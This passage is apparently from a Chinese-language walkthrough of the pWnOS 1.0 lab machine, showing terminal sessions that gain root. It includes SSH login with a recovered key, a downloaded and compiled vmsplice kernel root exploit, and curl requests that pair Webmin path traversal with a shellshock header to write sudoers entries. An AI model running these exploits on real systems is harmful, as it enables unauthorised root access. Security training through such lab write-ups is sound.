-   将私钥文件保存到当前目录来进行登陆测试

-   ```shell
    └─$ cp rsa/2048/dcbe2a56e8cdea6d17495f6648329ee2-4679 ./                        
                                                                                        
    ┌──(kali㉿kali)-[~/Documents/WalkThrough/pWnOS1.0]
    └─$ ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@192.168.2.138                
    Unable to negotiate with 192.168.2.138 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
                                                                                        
    ┌──(kali㉿kali)-[~/Documents/WalkThrough/pWnOS1.0]
    └─$ ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@192.168.2.138 -oHostKeyAlgorithms=ssh-rsa,ssh-dss
    sign_and_send_pubkey: no mutual signature supported
    obama@192.168.2.138's password: 
    Permission denied, please try again.
    obama@192.168.2.138's password: 
    Permission denied, please try again.
    obama@192.168.2.138's password: 
    obama@192.168.2.138: Permission denied (publickey,password).
    
    ```

-   使用私钥后还需要密码，开启`debug`模式来进行排错

    -   >   └─$ ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@192.168.2.138 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -vv
        >
        >   参数说明：
        >
        >   -vv 查看详细的连接信息

-   ![image-20230526190317586](https://raw.githubusercontent.com/r0o983/images/main/image-20230526190317586.png)

-   获得初始shell

-   ```shell
    └─$ ssh -i dcbe2a56e8cdea6d17495f6648329ee2-4679 obama@192.168.2.138 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss
    Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    Last login: Thu Jun 19 10:10:29 2008
    obama@ubuntuvm:~$ 
    
    参数说明：
    	-oPubkeyAcceptedKeyTypes 指定主机接受的key类型
    ```

-   使用内核提权

-   ```shell
    obama@ubuntuvm:~$ ip a
    1: lo: <LOOPBACK,UP,10000> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,10000> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:5e:18:c9 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.138/24 brd 192.168.2.255 scope global eth0
        inet6 fe80::20c:29ff:fe5e:18c9/64 scope link 
           valid_lft forever preferred_lft forever
    obama@ubuntuvm:~$ uname -a
    Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
    obama@ubuntuvm:~$ whoami
    obama
    obama@ubuntuvm:~$ sudo -l
    [sudo] password for obama:
    obama@ubuntuvm:~$ 
    
    ```

-   搜索内核版本

-   ```shell
    └─$ searchsploit linux kernel 2.6.2 | grep "Privilege"
    ```

-   下载对应的版本`searchsploit linux kernel 2.6.2 -m 5092`

-   将文件传输到靶机中并进行编译

-   ```shell
    obama@ubuntuvm:~$ wget 192.168.2.128/5092.c   
    --05:17:27--  http://192.168.2.128/5092.c
               => `5092.c'
    Connecting to 192.168.2.128:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 6,288 (6.1K) [text/x-c]
    
    100%[==================================================================================================================================================================>] 6,288         --.--K/s             
    
    05:17:27 (650.40 MB/s) - `5092.c' saved [6288/6288]
    
    obama@ubuntuvm:~$ gcc 5092.c -o 5092
    5092.c:289:28: warning: no newline at end of file
    ```

-   执行脚本获得root权限

-   ```shell
    obama@ubuntuvm:~$ ls -lhai
    total 36K
    538569 drwxr-xr-x 3 obama obama 4.0K 2023-05-26 05:18 .
    538561 drwxr-xr-x 6 root  root  4.0K 2008-06-11 09:26 ..
    538586 -rwxr-xr-x 1 obama obama  11K 2023-05-26 05:18 5092
    538585 -rwxr-xr-x 1 obama obama 6.2K 2023-05-26 05:17 5092.c
    538571 -rw------- 1 obama obama   42 2008-06-19 10:10 .bash_history
    538580 drwx------ 2 obama obama 4.0K 2008-06-12 11:22 .ssh
    obama@ubuntuvm:~$ ./5092
    -----------------------------------
     Linux vmsplice Local Root Exploit
     By qaaz
    -----------------------------------
    [+] mmap: 0x0 .. 0x1000
    [+] page: 0x0
    [+] page: 0x20
    [+] mmap: 0x4000 .. 0x5000
    [+] page: 0x4000
    [+] page: 0x4020
    [+] mmap: 0x1000 .. 0x2000
    [+] page: 0x1000
    [+] mmap: 0xb7e09000 .. 0xb7e3b000
    [+] root
    root@ubuntuvm:~# whoami
    root
    root@ubuntuvm:~# ip a
    1: lo: <LOOPBACK,UP,10000> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,10000> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:5e:18:c9 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.138/24 brd 192.168.2.255 scope global eth0
        inet6 fe80::20c:29ff:fe5e:18c9/64 scope link 
           valid_lft forever preferred_lft forever
    root@ubuntuvm:~# uname -a
    Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
    root@ubuntuvm:~# sudo -l
    User root may run the following commands on this host:
        (ALL) ALL
    root@ubuntuvm:~# 
    
    ```



### 使用shellshock漏洞进行提权（bash版本小于4.3）

```shell
# 如果下面的语句正确的输出了"hello" 则证明漏洞存在
env x='() { :; }; echo "hello"' bash -c date
```

-   查看之前下载的`2017.pl`文件发现组合方式为：`信息头+目标地址+端口号+/unauthenticated/+40个/..%01+需要读取的文件名`

-   ![image-20230526193851444](https://raw.githubusercontent.com/r0o983/images/main/image-20230526193851444.png)

-   使用curl发送主机头到靶机

-   ```shell
    └─$ curl "192.168.2.138:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/obama/shell.cgi" -A '() { :; }; /bin/echo "obama ALL=(ALL) NOPASSWORD:ALL" >> /etc/sudoers '
    <h1>Error - Missing Content-Type Header</h1>
    <pre>Failed to exec /usr/local/webmin/mscstyle3/unauthenticated/../../../../../../../../../../../../../../../../../../../../home/obama/shell.cgi : Permission denied
    </pre>
    
    参数说明：
    	`() { :; };` 固定写法  
    	/bin/echo 使用输出语句将obama用户写入到sudoer文件中，使其拥有root权限
    ```

-   由于不知道当前用户密码，所以切换到vmware用户进行提权演示

-   创建一个.cgi的文件，写入任意内容，并给定权限

-   ```shell
    └─$ curl "192.168.2.138:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/webshell.cgi" -A '() { :; }; /bin/echo "vmware ALL=(ALL) ALL" >> /etc/sudoers '
    <h1>Error - Missing Content-Type Header</h1>
    
    ```

-   回到靶机，检查用户是否具有root权限

-   ```shell
    vmware@ubuntuvm:~$ sudo -l
    User vmware may run the following commands on this host:
        (ALL) ALL
    vmware@ubuntuvm:~$ ip a
    1: lo: <LOOPBACK,UP,10000> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,10000> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:5e:18:c9 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.138/24 brd 192.168.2.255 scope global eth0
        inet6 fe80::20c:29ff:fe5e:18c9/64 scope link 
           valid_lft forever preferred_lft forever
    vmware@ubuntuvm:~$ whoami
    vmware
    vmware@ubuntuvm:~$ sudo /bin/bash
    root@ubuntuvm:~# whoami
    root
    root@ubuntuvm:~# 
    
    
    ```

    
